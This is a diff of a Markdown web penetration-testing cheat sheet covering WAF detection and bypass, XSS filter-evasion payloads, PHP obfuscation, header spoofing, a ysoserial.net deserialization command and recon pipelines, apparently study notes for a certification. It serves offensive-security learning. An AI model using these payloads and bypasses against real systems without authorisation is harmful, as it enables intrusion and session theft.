@@ -3,11 +3,10 @@
 ## What WAF does the application have?
 <img class="center" height="450em" src="https://user-images.githubusercontent.com/54555784/188950014-db9eae26-8801-4f68-a673-01f0d7af5c15.png" />
 
-### Tools - Detection WAF
+### Tools - WAF Detection
 -> wafw00f  
-https://github.com/EnableSecurity/wafw00f
-
--> nmap --script=http-waf-fingerprint  
+https://github.com/EnableSecurity/wafw00f  
+-> nmap <ip> --script=http-waf-fingerprint  
 https://nmap.org/nsedoc/scripts/http-waf-fingerprint.html
 
 -> imperva-detect  
@@ -64,11 +63,9 @@ https://www.silisoftware.com/tools/ipconverter.php
 ### PHP Non-Alphanumeric 
 `$\_="{"; #XOR char`  
 `echo $\_=($\_^"<").($\_^">").($\_^"/"); #XOR = GET`  
-
 https://web.archive.org/web/20160516145602/http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/
 
 ### PHP Bypass - disable_functions
-
 #### Functions
 -> shell_exec  
 ```
@@ -100,15 +97,12 @@ https://web.archive.org/web/20160516145602/http://www.thespanner.co.uk/2011/09/2
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/obfuscation/obfuscation.php
 
 ## Online PHP Executor
-
-"3v4l.org (leetspeak for eval) is an online shell that allows you to run your code on my server. I compiled more than 250 different PHP versions (every version released since 4.3.0) for you to run online."
-
+"3v4l.org (leetspeak for eval) is an online shell that allows you to run your code on my server. I compiled more than 250 different PHP versions (every version released since 4.3.0) for you to run online."  
 https://3v4l.org/  
 
 ### PHP Obfuscation Decoders 
-
 https://malwaredecoder.com/  
-https://hackvertor.co.uk/public
+https://hackvertor.co.uk/public  
 
 ### Spoofing Internal IP in Request Header
 
@@ -123,7 +117,6 @@ X-Client-IP: 127.0.0.1
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/headers_internal_bypass.txt
 
 ## Cross-Site Scripting (Reflected, Stored, DOM, Mutation, Poliglote)
-
 ### XSS Protection
 -> XSS Auditor and XSS Filter  
 https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md  
@@ -140,20 +133,16 @@ https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xs
 https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt
 
 ### XSS Keylogger
-
 https://rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/  
 https://github.com/hadynz/xss-keylogger
 
 ### XSS Mutation
-
 http://www.businessinfo.co.uk/labs/mxss/
 
 ### XSS Poliglote
-
 https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 
 ### Regex Blacklist Filtering
-
 -> Filter blocking on - Bypass  
 `(on\w+\s*=)`  
 ```
@@ -165,7 +154,6 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 
 ### Keyword Based in Filter
 #### Alert Blocked - Bypass
-  
 ```
 <script>\u0061lert(1)</script>
 <script>\u0061\u006C\u0065\u0072\u0074(1)</script>
@@ -187,7 +175,6 @@ e.g.
 `decodeURIComponent(/alert(%22xss%22)/.source)`  
  
 ### Other bypass techniques
-
 -> unicode  
 `<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)"/>`  
 
@@ -208,7 +195,6 @@ http://www.unit-conversion.info/texttools/hexadecimal/
 
 ### Other Examples
 #### HTML Tag
-
 ```
 <div>here</div>
 ```
@@ -216,7 +202,6 @@ http://www.unit-conversion.info/texttools/hexadecimal/
 `<svg/onload=alert(1)`
 
 #### HTML Tag Attributes
-
 ```
 <input value="here"/></input>
 ```
@@ -225,7 +210,6 @@ http://www.unit-conversion.info/texttools/hexadecimal/
 `" /><script>alert(1)</script>`
   
 #### Script Tag
-  
 ```
 <script>
     var name="here";
@@ -236,14 +220,12 @@ http://www.unit-conversion.info/texttools/hexadecimal/
 `";alert(1);//`
 
 #### Event Attributes
-
 `<button onclick="here;">Okay!</button>`
 
 ->  
 `alert(1)`
 
 #### Dom Based
-  
 ```
 <script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href=\'"+ok+"\'>ok</a>";</script>
 ```
@@ -252,7 +234,6 @@ http://www.unit-conversion.info/texttools/hexadecimal/
 `javascript:alert(1)`
 
 ### JavaScript Encoding
-
 -> jjencode  
 https://utf-8.jp/public/jjencode.html   
 -> aaencode  
@@ -263,7 +244,6 @@ http://www.jsfuck.com/
 https://syllab.fr/projets/experiments/xcharsjs/5chars.pipeline.html  
 
 ### Decoder - Obfuscation (Javascript Decoder and PHP)
-
 https://malwaredecoder.com/  
 
 ### XSS - Session Hijacking
@@ -341,13 +321,13 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 -> Detect via Response Simple in SOAP Message
 ```
 POST /endpoint HTTP/1.1
-Host: ip:port
+Host: <ip>:<port>
 
 <SOAP:Envelope>
 </SOAP:Envelope>
 ```
 
-`ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c ping ip" -o raw`  
+`ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c ping <ip>" -o raw`  
 https://github.com/pwntester/ysoserial.net  
 ```
 POST /endpoint HTTP/1.1
@@ -1093,13 +1073,12 @@ e.g.
 ### Template - Nuclei
 https://raw.githubusercontent.com/pikpikcu/nuclei-templates/master/vulnerabilities/crlf-injection.yaml
 
-
 ## Elasticsearch - API
 -> Extract info  
 ```
-http://10.10.57.49:9200/_cat/indices?v  
-http://10.10.57.49:9200/<indice>  
-http://10.10.57.49:9200/_search?pretty=true&q=pass  
+http://<ip:>9200/_cat/indices?v  
+http://<ip>:9200/<indice>  
+http://<ip>:9200/_search?pretty=true&q=pass  
 ```
 
 ## XML External Entity - XXE
@@ -1265,19 +1244,19 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 
 ## CMS
 ### Wordpress
--> wpscan    
+-> wpscan  
 `wpscan --url http://site.com/wordpress --api-token <your_token> --enumarate vp --plugins-detection aggressive`  
 https://wpscan.com/wordpress-security-scanner
 
 ### Joomla
 -> juumla  
-`python main.py -u <target>`
-https://github.com/oppsec/juumla
+`python main.py -u <target>`  
+https://github.com/oppsec/juumla  
 
 ### Drupal
 -> droopescan  
-`droopescan scan drupal -u <target> -t 32`
-https://github.com/SamJoan/droopescan
+`droopescan scan drupal -u <target> -t 32`  
+https://github.com/SamJoan/droopescan  
 
 ## Fuzzing (+) 
 ### Fuzzing Subdomain - DNS
@@ -1382,24 +1361,25 @@ https://github.com/robertdavidgraham/masscan
 `cat subdomains.txt | gau | gf xss | uro | httpx -silent | anew parameters.txt`
 
 2.2 -> paramspider + uro + httpx  
-`cat subdomains.txt | xargs -n 1 python paramspider.py -d |httpx -silent | gf xss | uro | anew parameters.txt`  
+`cat subdomains.txt | xargs -n 1 python paramspider.py -d | httpx -silent | gf xss | uro | anew parameters.txt`  
 
 #### 3 - JS files
 3.1 -> gau+grep+httpx  
 `cat subdomains.txt | grep "\.js" | httpx -fc 404 -silent -o js_files.txt`  
-or
+or  
 `cat subdomains.txt | gau | subjs`
 
 #### 4 - Discover endpoints and their parameters in JS files
 `python linkfinder.py -i https://example.com/1.js -o results.html`
 
--> Used Tools
+-> Used Tools  
 https://github.com/projectdiscovery/subfinder  
 https://github.com/aboul3la/Sublist3r  
 https://github.com/devanshbatham/ParamSpider  
 https://github.com/s0md3v/uro  
 https://github.com/projectdiscovery/httpx  
 https://github.com/tomnomnom/gf  
+https://github.com/1ndianl33t/Gf-Patterns  
 https://github.com/stedolan/jq  
 https://github.com/lc/subjs  
 https://github.com/GerbenJavado/LinkFinder  
@@ -1429,11 +1409,11 @@ https://www.youtube.com/watch?v=2-im6aL6PkI
 ![13](https://user-images.githubusercontent.com/54555784/199234729-5055681c-8841-4f41-b072-dea537f9ba16.png)
 
 References:  
-https://elearnsecurity.com/product/ewptxv2-certification/
-https://ine.com/learning/courses/web-application-penetration-testing-e-xtreme
-https://rodolfomarianocy.medium.com/overview-ewptx-5a9d78414c7a
-https://crowsec.com.br/
-https://portswigger.net/web-security/all-labs
+https://elearnsecurity.com/product/ewptxv2-certification/  
+https://ine.com/learning/courses/web-application-penetration-testing-e-xtreme  
+https://rodolfomarianocy.medium.com/overview-ewptx-5a9d78414c7a  
+https://crowsec.com.br/  
+https://portswigger.net/web-security/all-labs  
 
 ## Other tools and things
 #### Search across a half million git repos
